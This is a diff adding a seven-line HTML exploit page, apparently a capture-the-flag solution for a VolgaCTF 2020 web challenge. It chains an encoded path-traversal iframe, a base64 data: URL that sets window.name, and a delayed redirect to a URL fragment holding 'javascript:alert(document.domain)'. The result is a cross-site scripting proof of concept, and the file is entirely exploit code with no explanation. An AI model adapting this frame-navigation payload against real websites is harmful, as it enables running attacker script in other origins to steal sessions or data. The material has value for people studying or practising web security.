@@ -1,0 +1,7 @@
+<iframe src='https://archive.q.2020.volgactf.ru/x/..%2f'></iframe>
+<script>
+window.onload=function (){
+  frames[0].frames[0].location='data:text/html;base64,PGlmcmFtZSBuYW1lPWFjdGl2ZVBhZ2Ugc3JjPWh0dHBzOi8vYXJjaGl2ZS5xLjIwMjAudm9sZ2FjdGYucnUvP2FhYT48L2lmcmFtZT48c2NyaXB0PndpbmRvdy5uYW1lPSd2b2xnYWN0Zic7PC9zY3JpcHQ+';
+  setTimeout(function(){frames[0].location='https://archive.q.2020.volgactf.ru/x/..%2f#javascript:alert(document.domain)'},1000)
+}
+</script>
